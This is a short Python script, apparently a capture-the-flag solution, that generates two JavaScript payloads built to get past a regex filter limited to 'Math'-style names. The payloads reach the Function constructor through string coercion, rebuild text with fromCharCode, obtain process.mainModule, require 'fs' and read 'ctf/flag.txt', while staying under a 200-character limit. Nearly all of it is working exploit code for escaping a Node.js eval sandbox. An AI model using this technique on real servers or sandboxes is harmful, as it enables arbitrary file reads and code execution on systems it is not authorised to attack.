import re
encode = lambda code: list(map(ord,code))
decode = lambda code: "".join(map(chr,code))
#print(decode([99,116,102,47,102,108,97,103,46,116,120,116])) # example decode

# build a lambda-function that takes a string and uses it under the variablename "Math" to be allowed to call it, as the regex allows Math.x
# then get the string-constructor and call fromCharCode to get a string from numbers. 
# then we use the function-constructor to create a function that returns the process.mainModule
# and save it to String.x
a=f"""
	(m0=>(
		m0=m0.constructor,
		m0.x=m0.constructor(
			m0.fromCharCode({encode("return process.mainModule")})
		)()
	))(Math+1)
"""

# now we reuse String.x = mainModule
# then we call process.mainModule.require('fs').readFileSync('ctf/flag.txt')
b=f"""
	((m0,m1)=>
		(m0=m0.constructor,
		m1=m0.fromCharCode,
		m0=m0.x,
		m0=m0.require(m1({encode("fs")})),
		m0=m0.readFileSync(m1({encode("ctf/flag.txt")}))
	))(Math+1)
"""

# remove whitespaces, replace variables with other names
a=re.sub(r"[\s\[\]]", "", a).replace("m0","Math")
b=re.sub(r"[\s\[\]]", "", b).replace("m0","Math").replace("m1", "MathÐ1")
print(a)
print(b)
print("Lengths (must be <200)", len(a), len(b))
